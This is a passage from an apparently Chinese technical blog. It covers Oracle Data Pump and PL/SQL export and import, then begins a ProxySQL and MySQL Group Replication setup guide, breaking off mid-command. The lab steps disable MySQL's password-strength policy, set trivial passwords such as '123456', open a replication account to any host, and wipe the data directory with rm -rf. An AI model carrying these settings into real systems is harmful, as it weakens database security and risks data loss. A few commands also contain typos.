<p>2)并行进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parallel expdp xinxiaoyong&#x2F;123456@orcl directory&#x3D;testdata1 dumpfile&#x3D;xinxiaoyong3.dmp parallel&#x3D;40 job_name&#x3D;xinxiaoyong3</span><br></pre></td></tr></table></figure>

<p>3)按表名导 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expdp xinxiaoyong&#x2F;123456@orcl tables&#x3D;emp,dept dumpfile&#x3D;expdp.dmp directory&#x3D;testdata1;</span><br></pre></td></tr></table></figure>

<p>4)按查询条件导 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expdp xinxiaoyong&#x2F;123456@orcl directory&#x3D;testdata1 dumpfile&#x3D;expdp.dmp tables&#x3D;emp query&#x3D;‘WHERE deptno&#x3D;20’;</span><br></pre></td></tr></table></figure>

<p>5)按表空间导 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expdp system&#x2F;manager directory&#x3D;testdata1 dumpfile&#x3D;tablespace.dmp tablespaces&#x3D;temp,example;</span><br></pre></td></tr></table></figure>

<p>6)导整个数据库 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expdp system&#x2F;manager directory&#x3D;testdata1 dumpfile&#x3D;full.dmp FULL&#x3D;y;</span><br></pre></td></tr></table></figure>

<h6 id="6-还原数据"><a href="#6-还原数据" class="headerlink" title="6.还原数据"></a>6.还原数据</h6><p>1)导到指定用户下 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impdp xinxiaoyong&#x2F;123456 directory&#x3D;testdata1 dumpfile&#x3D;expdp.dmp schemas&#x3D;xinxiaoyong;</span><br></pre></td></tr></table></figure>

<p>2)改变表的owner </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impdp system&#x2F;manager directory&#x3D;testdata1 dumpfile&#x3D;expdp.dmp tables&#x3D;xinxiaoyong.dept remap_schema &#x3D;xinxiaoyong:system;</span><br></pre></td></tr></table></figure>

<p>3)导入表空间 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impdp system&#x2F;manager directory&#x3D;testdata1 dumpfile&#x3D;tablespace.dmp tablespaces&#x3D;example;</span><br></pre></td></tr></table></figure>

<p>4)导入数据库 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impdb system&#x2F;manager directory&#x3D;dump_dir dumpfile&#x3D;full.dmp FULL&#x3D;y;</span><br></pre></td></tr></table></figure>

<p>5)追加数据 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impdp system&#x2F;manager directory&#x3D;testdata1 dumpfile&#x3D;expdp.dmp schemas&#x3D;system table_exists_action;</span><br></pre></td></tr></table></figure>

<h5 id="3、PLSQL方法："><a href="#3、PLSQL方法：" class="headerlink" title="3、PLSQL方法："></a>3、PLSQL方法：</h5><p>登录plsql工具，所使用用户为源数据库有导出权限（exp_full_database,dba等）的用户。</p>
<h6 id="1-导出建表语句（包括存储结构）"><a href="#1-导出建表语句（包括存储结构）" class="headerlink" title="  1.导出建表语句（包括存储结构）"></a>  1.导出建表语句（包括存储结构）</h6><p>  导出步骤tools -&gt;export user object，选择要导出的对象，导出.sql格式文件并等待导出完成，如下图：</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908154150273.png" alt="image-20200908154150273"></p>
<p>导出数据文件 ;</p>
<h5 id="2-导出步骤tools-gt-export-tables，选择要导出的表及导出的格式进行导出。"><a href="#2-导出步骤tools-gt-export-tables，选择要导出的表及导出的格式进行导出。" class="headerlink" title="   2.导出步骤tools -&gt;export tables，选择要导出的表及导出的格式进行导出。"></a>   2.导出步骤tools -&gt;export tables，选择要导出的表及导出的格式进行导出。</h5><p>提示说明：采用第三方工具导出导入整个数据库的话，耗时较长，一定要有足够的时间来操作(数据量大的话需要好几个小时)</p>
<h5 id="3-导入建表语句"><a href="#3-导入建表语句" class="headerlink" title="3.导入建表语句"></a>3.导入建表语句</h5><p>   导入步骤tools-&gt;import tables-&gt;SQL Inserts 导入.sql文件</p>
<h5 id="4-导入数据；"><a href="#4-导入数据；" class="headerlink" title="4.导入数据；"></a>4.导入数据；</h5><p>   tools-&gt;import talbes，然后再根据导出的数据格式选择导入dmp文件，或者sql文件，或者pde文件，如下图。</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/08/PLSQL%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E8%AF%A6%E8%A7%A3/image-20200908155218585.png" alt="image-20200908155218585"></p>
<p>  提示说明：导入之前最好把以前的表删除，当然导入另外数据库除外。<br>  另外导入时当发现进度条一直卡在一个点，而且导出的文件不再增大时，甚至是提示程序未响应，千万不要以为程序卡死了，这个导入导出就是比较缓慢，只要没有提示报错，或者导入完成就不要停止程序。</p>
]]></content>
      <tags>
        <tag>oracle</tag>
        <tag>PLSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>ProxySQL+MGR</title>
    <url>/2019/03/12/ProxySQL+MGR/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src= "/img/loading.gif" data-src="/2019/03/12/ProxySQL+MGR/image-20200821112405285.png" alt="image-20200821112405285"></p>
<p>ProxySQL 是基于 MySQL 的一款开源的中间件的产品</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以实现读写分离，支持Query路由功能，支持动态指定某个SQL进行cache，支持动态加载配置、故障切换和一些SQL的过滤功能。还有一些同类产品比如DBproxy、MyCAT、OneProxy等。</span><br></pre></td></tr></table></figure>

<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h4><p>基于传统异步复制和半同步复制的缺陷——数据的一致性问题无法保证，MySQL官方在5.7.17版本正式推出组复制（MySQL Group Replication，简称MGR）。</p>
<p>由若干个节点共同组成一个复制组，一个事务的提交，必须经过组内大多数节点（N / 2 +  1）决议并通过，才能得以提交。如上图所示，由3个节点组成一个复制组，Consensus层为一致性协议层，在事务提交过程中，发生组间通讯，由2个节点决议(certify)通过这个事务，事务才能够最终得以提交并响应。</p>
<p>引入组复制，主要是为了解决传统异步复制和半同步复制可能产生数据不一致的问题。组复制依靠分布式一致性协议(Paxos协议的变体)，实现了分布式下数据的最终一致性，提供了真正的数据高可用方案(是否真正高可用还有待商榷)。其提供的多写方案，给我们实现多活方案带来了希望。</p>
<h6 id="通过MGR-ProxySQL可以实际主节点故障时应用无感应自动切换到新的主节点。“自动故障恢复“和“读写分离“"><a href="#通过MGR-ProxySQL可以实际主节点故障时应用无感应自动切换到新的主节点。“自动故障恢复“和“读写分离“" class="headerlink" title="通过MGR+ProxySQL可以实际主节点故障时应用无感应自动切换到新的主节点。“自动故障恢复“和“读写分离“"></a>通过MGR+ProxySQL可以实际主节点故障时应用无感应自动切换到新的主节点。“自动故障恢复“和“读写分离“</h6><p>根据上图，描述下实现思路：三个节点使multi-primary（多主）的方式连接，应用通过连接ProxySQL [ˈprɑːksi]中间件，根据sql的属性（是否为select语句）来决定连接哪一个节点，一个可写节点，两个只读节点（其实三个都是可写节点，只不过通过proxysql进行了读写分离）。如果默认的可写节点挂掉的话，proxysql通过定期运行的调度器会将另一个只读节点的其中一台设为可写节点，实际主节点故障应用无感应的要求。上述的整个过程中，应用无需任何变动。应用从意识发生了故障，到连接重新指向新的主，正常提供服务，秒级别的间隔。</p>
<h4 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a><strong>一、环境准备</strong></h4><table>
<thead>
<tr>
<th>192.168.219.151</th>
<th>mgr-node1</th>
<th>centos7.6</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.152</td>
<td>mgr-node2</td>
<td>centos7.6</td>
</tr>
<tr>
<td>192.168.219.153</td>
<td>mgr-node3</td>
<td>centos7.6</td>
</tr>
<tr>
<td>192.168.219.154</td>
<td>proxysql-node</td>
<td>centos7.6</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mgr-node1 ~]# cat /etc/hosts</span><br><span class="line">......</span><br><span class="line">192.168.219.151 mgr-node1</span><br><span class="line">192.168.219.152 mgr-node2</span><br><span class="line">192.168.219.153 mgr-node3</span><br><span class="line">192.168.219.154 proxysql-node</span><br></pre></td></tr></table></figure>

<h4 id="二、在三个节点上安装Mysql5-7"><a href="#二、在三个节点上安装Mysql5-7" class="headerlink" title="二、在三个节点上安装Mysql5.7"></a><strong>二、在三个节点上安装Mysql5.7</strong></h4><h5 id="1、MySQL-yum包下载"><a href="#1、MySQL-yum包下载" class="headerlink" title="1、MySQL yum包下载"></a>1、MySQL yum包下载</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mysql1 ~]# wget http://repo.mysql.com/mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>

<h5 id="2、MySQL-软件源安转"><a href="#2、MySQL-软件源安转" class="headerlink" title="2、MySQL 软件源安转"></a>2、MySQL 软件源安转</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mysql1 ~]# yum -y install mysql57-community-release-el7-10.noarch.rpm</span><br></pre></td></tr></table></figure>

<h5 id="3、MySQL-服务安装"><a href="#3、MySQL-服务安装" class="headerlink" title="3、MySQL 服务安装"></a>3、MySQL 服务安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mysql1 ~]# yum install  -y  mysql-community-server mysql</span><br></pre></td></tr></table></figure>

<h5 id="4、MySQL-服务启动"><a href="#4、MySQL-服务启动" class="headerlink" title="4、MySQL 服务启动"></a>4、MySQL 服务启动</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mysql1 ~]# systemctl start mysqld.service</span><br></pre></td></tr></table></figure>

<h5 id="5、MySQL-服务运行状态检查"><a href="#5、MySQL-服务运行状态检查" class="headerlink" title="5、MySQL 服务运行状态检查"></a>5、MySQL 服务运行状态检查</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mysql1 ~]# systemctl status mysqld.service</span><br></pre></td></tr></table></figure>

<h5 id="6、MySQL-修改临时密码"><a href="#6、MySQL-修改临时密码" class="headerlink" title="6、MySQL 修改临时密码"></a>6、MySQL 修改临时密码</h5><ul>
<li>为了加强安全性，MySQL5.7为root用户随机生成了一个密码，在error log中，关于error log的位置，如果安装的是RPM包，则默认是/var/log/mysqld.log。</li>
<li>只有启动过一次mysql才可以查看临时密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@mysql1 ~]<span class="comment"># grep 'temporary password' /var/log/mysqld.log</span></span><br></pre></td></tr></table></figure>

<h5 id="7、登陆并修改密码"><a href="#7、登陆并修改密码" class="headerlink" title="7、登陆并修改密码"></a>7、登陆并修改密码</h5><h6 id="1、使用默认的密码登陆"><a href="#1、使用默认的密码登陆" class="headerlink" title="1、使用默认的密码登陆"></a>1、使用默认的密码登陆</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mysql1 ~]# mysql -uroot -p"默认密码"</span><br></pre></td></tr></table></figure>

<h6 id="2、修改密码"><a href="#2、修改密码" class="headerlink" title="2、修改密码"></a>2、修改密码</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;</span><br></pre></td></tr></table></figure>

<h5 id="8、解决不符合密码复杂性要求"><a href="#8、解决不符合密码复杂性要求" class="headerlink" title="8、解决不符合密码复杂性要求**"></a><strong><em>8、解决不符合密码复杂性要求**</em></strong></h5><p>MySQL5.6.6版本之后增加了密码强度验证插件validate_password，相关参数设置的较为严格。使用了该插件会检查设置的密码是否符合当前设置的强度规则，若不满足则拒绝设置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">登陆数据库查看</span><br><span class="line">mysql&gt; show variables like &#39;validate_password%&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+--------------------------------------+-------+</span><br><span class="line">| Variable_name                        | Value |</span><br><span class="line">+--------------------------------------+-------+</span><br><span class="line">| validate_password_dictionary_file    |       |</span><br><span class="line">| validate_password_length             | 8     |</span><br><span class="line">| validate_password_mixed_case_count   | 1     |</span><br><span class="line">| validate_password_number_count       | 1     |</span><br><span class="line">| validate_password_policy             | LOW   |</span><br><span class="line">| validate_password_special_char_count | 1     |</span><br><span class="line">+--------------------------------------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">1、validate_password_policy</span><br><span class="line">代表的密码策略，可配置的值有以下：默认是MEDIUM</span><br><span class="line">0 or LOW 仅需需符合密码长度（由参数validate_password_length指定）</span><br><span class="line">1 or MEDIUM 满足LOW策略，同时还需满足至少有1个数字，小写字母，大写字母和特殊字符</span><br><span class="line">2 or STRONG 满足MEDIUM策略，同时密码不能存在字典文件（dictionary file）中</span><br><span class="line"> </span><br><span class="line">2、validate_password_dictionary_file</span><br><span class="line"># 用于配置密码的字典文件，当validate_password_policy设置为STRONG时可以配置密码字典文件，字典文件中存在的密码不得使用。</span><br><span class="line"> </span><br><span class="line">3、validate_password_length</span><br><span class="line"># 用来设置密码的最小长度，默认值是8最小是0</span><br><span class="line"> </span><br><span class="line">4、validate_password_mixed_case_count   </span><br><span class="line"># 当validate_password_policy设置为MEDIUM或者STRONG时，密码中至少同时拥有的小写和大写字母的数量，默认是1最小是0；默认是至少拥有一个小写和一个大写字母。</span><br><span class="line"> </span><br><span class="line">5、validate_password_number_count     </span><br><span class="line"># 当validate_password_policy设置为MEDIUM或者STRONG时，密码中至少拥有的数字的个数，默认1最小是0</span><br><span class="line"> </span><br><span class="line">6、validate_password_special_char_count</span><br><span class="line"># 当validate_password_policy设置为MEDIUM或者STRONG时，密码中至少拥有的特殊字符的个数，默认1最小是0</span><br></pre></td></tr></table></figure>



<h6 id="1、修改-密码策略-将策略要求置为LOW，长度要求置为1"><a href="#1、修改-密码策略-将策略要求置为LOW，长度要求置为1" class="headerlink" title="1、修改 密码策略  将策略要求置为LOW，长度要求置为1"></a>1、修改 密码策略  将策略要求置为LOW，长度要求置为1</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global validate_password_policy&#x3D;0;</span><br></pre></td></tr></table></figure>

<h6 id="2、修改密码的长度"><a href="#2、修改密码的长度" class="headerlink" title="2、修改密码的长度"></a>2、修改密码的长度</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global validate_password_length&#x3D;1;</span><br></pre></td></tr></table></figure>

<h6 id="3、再次修改密码成功"><a href="#3、再次修改密码成功" class="headerlink" title="3、再次修改密码成功"></a>3、再次修改密码成功</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;</span><br></pre></td></tr></table></figure>

<h4 id="三、MGR组复制环境部署-多写模式"><a href="#三、MGR组复制环境部署-多写模式" class="headerlink" title="三、MGR组复制环境部署 (多写模式)"></a><strong>三、MGR组复制环境部署 (多写模式)</strong></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">由于之前做了其他测试，这里需要将三个节点的mysql环境抹干净：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl stop mysqld</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> rm -rf /var/lib/mysql</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl start mysqld</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">然后重启密码</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat /var/<span class="built_in">log</span>/mysqld.log|grep <span class="string">'A temporary password'</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mysql -p123456</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global validate_password_policy=0;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global validate_password_length=1;</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> password=password(<span class="string">"123456"</span>);</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> flush privileges;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=======================================================</span><br><span class="line">1） MGR-node1节点操作</span><br><span class="line">[root@mgr-node1 ~]# mysql -uroot -p"123456"</span><br><span class="line">.........</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select uuid();</span></span><br><span class="line">+--------------------------------------+</span><br><span class="line">| uuid()                               |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| 58462f3b-ccd9-11ea-8eb2-000c29c57992 |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>后面三台配置文件中的uuid都使用node1节点的uuid</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">https://www.cnblogs.com/mysql-hongling/p/9556679.html</span></span><br><span class="line"><span class="meta">#</span><span class="bash">上方链接有文件中参数的相关解释</span></span><br><span class="line">[root@mgr-node1 ~]# cp /etc/my.cnf&#123;,.bak&#125;</span><br><span class="line">[root@mgr-node1 ~]# &gt;/etc/my.cnf</span><br><span class="line">[root@mgr-node1 ~]# cat /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">datadir = /var/lib/mysql</span><br><span class="line">socket = /var/lib/mysql/mysql.sock</span><br><span class="line">        </span><br><span class="line">symbolic-links = 0</span><br><span class="line">        </span><br><span class="line">log-error = /var/log/mysqld.log</span><br><span class="line">pid-file = /var/run/mysqld/mysqld.pid</span><br><span class="line">    </span><br><span class="line"><span class="meta">#</span><span class="bash">GTID:</span></span><br><span class="line">server_id = 1</span><br><span class="line">gtid_mode = on</span><br><span class="line">enforce_gtid_consistency = on</span><br><span class="line">    </span><br><span class="line">master_info_repository=TABLE</span><br><span class="line">relay_log_info_repository=TABLE</span><br><span class="line">binlog_checksum=NONE</span><br><span class="line">        </span><br><span class="line"><span class="meta">#</span><span class="bash">binlog</span></span><br><span class="line">log_bin = mysql-bin</span><br><span class="line">log-slave-updates = 1</span><br><span class="line">binlog_format = row</span><br><span class="line">sync-master-info = 1</span><br><span class="line">sync_binlog = 1</span><br><span class="line">       </span><br><span class="line"><span class="meta">#</span><span class="bash">relay <span class="built_in">log</span></span></span><br><span class="line">skip_slave_start = 1</span><br><span class="line">    </span><br><span class="line">transaction_write_set_extraction=XXHASH64     </span><br><span class="line">loose-group_replication_group_name="58462f3b-ccd9-11ea-8eb2-000c29c57992"    </span><br><span class="line">loose-group_replication_start_on_boot=off   </span><br><span class="line">loose-group_replication_local_address= "192.168.219.151:24901"</span><br><span class="line">loose-group_replication_group_seeds= "192.168.219.151:24901,192.168.219.152:24901,192.168.219.153:24901"</span><br><span class="line">loose-group_replication_bootstrap_group=off</span><br><span class="line">loose-group_replication_single_primary_mode=off     </span><br><span class="line">loose-group_replication_enforce_update_everywhere_checks=on   </span><br><span class="line">loose-group_replication_ip_whitelist="192.168.219.0/24,127.0.0.1/8"</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">重启mysql服务</span><br><span class="line">[root@mgr-node1 ~]# systemctl restart mysqld</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">登录mysql进行相关设置操作</span><br><span class="line">[root@mgr-node1 ~]# mysql -uroot -p"123456"</span><br><span class="line">......</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET SQL_LOG_BIN=0;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">下面我执行报错了，采用最上面的方式解决</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT REPLICATION SLAVE ON *.* TO rpl_slave@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'slave@123'</span>;</span></span><br><span class="line">ERROR 1819 (HY000): Your password does not satisfy the current policy requirements</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global validate_password_policy=0;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">set</span> global validate_password_length=1;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">再次执行就可以了</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT REPLICATION SLAVE ON *.* TO rpl_slave@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'slave@123'</span>;</span></span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> FLUSH PRIVILEGES;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">  reset master;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET SQL_LOG_BIN=1;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">  CHANGE MASTER TO MASTER_USER=<span class="string">'rpl_slave'</span>, MASTER_PASSWORD=<span class="string">'slave@123'</span> FOR CHANNEL <span class="string">'group_replication_recovery'</span>;</span></span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.02 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> INSTALL PLUGIN group_replication SONAME <span class="string">'group_replication.so'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.14 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SHOW PLUGINS;</span></span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">| Name                       | Status   | Type               | Library              | License |</span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">| binlog                     | ACTIVE   | STORAGE ENGINE     | NULL                 | GPL     |</span><br><span class="line">| mysql_native_password      | ACTIVE   | AUTHENTICATION     | NULL                 | GPL     |</span><br><span class="line">| ............................................................................................|</span><br><span class="line">| group_replication          | ACTIVE   | GROUP REPLICATION  | group_replication.so | GPL     |</span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">46 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET GLOBAL group_replication_bootstrap_group=ON;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> START GROUP_REPLICATION;</span></span><br><span class="line">Query OK, 0 rows affected (2.21 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET GLOBAL group_replication_bootstrap_group=OFF;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM performance_schema.replication_group_members;</span></span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| CHANNEL_NAME              | MEMBER_ID                            | MEMBER_HOST | MEMBER_PORT | MEMBER_STATE |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| group_replication_applier | aa42205a-cc7b-11ea-a8c3-000c29c57992 | mgr-node1   |        3306 | ONLINE       |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">比如要保证上面的group_replication_applier的状态为<span class="string">"ONLINE"</span>才对！</span></span><br><span class="line"> </span><br><span class="line">创建一个测试库</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE DATABASE kevin CHARACTER SET utf8 COLLATE utf8_general_ci;   </span></span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use kevin;</span></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> create table <span class="keyword">if</span> not exists haha (id int(10) PRIMARY KEY AUTO_INCREMENT,name varchar(50) NOT NULL);</span></span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> insert into kevin.haha values(1,<span class="string">"wangshibo"</span>),(2,<span class="string">"guohuihui"</span>),(3,<span class="string">"yangyang"</span>),(4,<span class="string">"shikui"</span>);</span></span><br><span class="line">Query OK, 4 rows affected (0.16 sec)</span><br><span class="line">Records: 4  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from kevin.haha;</span></span><br><span class="line">+----+-----------+</span><br><span class="line">| id | name      |</span><br><span class="line">+----+-----------+</span><br><span class="line">|  1 | wangshibo |</span><br><span class="line">|  2 | guohuihui |</span><br><span class="line">|  3 | yangyang  |</span><br><span class="line">|  4 | shikui    |</span><br><span class="line">+----+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=====================================================================</span><br><span class="line">2） MGR-node2节点操作</span><br><span class="line">[root@mgr-node2 ~]# cp /etc/my.cnf&#123;,.bak&#125;</span><br><span class="line">[root@mgr-node2 ~]# &gt;/etc/my.cnf</span><br><span class="line">[root@mgr-node2 ~]# cat /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">datadir = /var/lib/mysql</span><br><span class="line">socket = /var/lib/mysql/mysql.sock</span><br><span class="line">      </span><br><span class="line">symbolic-links = 0</span><br><span class="line">      </span><br><span class="line">log-error = /var/log/mysqld.log</span><br><span class="line">pid-file = /var/run/mysqld/mysqld.pid</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash">GTID:</span></span><br><span class="line">server_id = 2</span><br><span class="line">gtid_mode = on</span><br><span class="line">enforce_gtid_consistency = on</span><br><span class="line">  </span><br><span class="line">master_info_repository=TABLE</span><br><span class="line">relay_log_info_repository=TABLE</span><br><span class="line">binlog_checksum=NONE</span><br><span class="line">      </span><br><span class="line"><span class="meta">#</span><span class="bash">binlog</span></span><br><span class="line">log_bin = mysql-bin</span><br><span class="line">log-slave-updates = 1</span><br><span class="line">binlog_format = row</span><br><span class="line">sync-master-info = 1</span><br><span class="line">sync_binlog = 1</span><br><span class="line">     </span><br><span class="line"><span class="meta">#</span><span class="bash">relay <span class="built_in">log</span></span></span><br><span class="line">skip_slave_start = 1</span><br><span class="line">  </span><br><span class="line">transaction_write_set_extraction=XXHASH64</span><br><span class="line">loose-group_replication_group_name="58462f3b-ccd9-11ea-8eb2-000c29c57992"</span><br><span class="line">loose-group_replication_start_on_boot=off</span><br><span class="line">loose-group_replication_local_address= "192.168.219.152:24901"</span><br><span class="line">loose-group_replication_group_seeds= "192.168.219.151:24901,192.168.219.152:24901,192.168.219.153:24901"</span><br><span class="line">loose-group_replication_bootstrap_group=off</span><br><span class="line">loose-group_replication_single_primary_mode=off</span><br><span class="line">loose-group_replication_enforce_update_everywhere_checks=on</span><br><span class="line">loose-group_replication_ip_whitelist="192.168.219.0/24,127.0.0.1/8"</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">重启mysql服务</span><br><span class="line">[root@mgr-node2 ~]# systemctl restart mysqld</span><br><span class="line">登录mysql进行相关设置操作</span><br><span class="line">[root@mgr-node2 ~]# mysql -uroot -p"123456"</span><br><span class="line">.........</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET SQL_LOG_BIN=0;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"><span class="meta">#</span><span class="bash">如果报错按照上面的操作一遍</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT REPLICATION SLAVE ON *.* TO rpl_slave@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'slave@123'</span>;</span></span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> FLUSH PRIVILEGES;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> reset master;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET SQL_LOG_BIN=1;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">  CHANGE 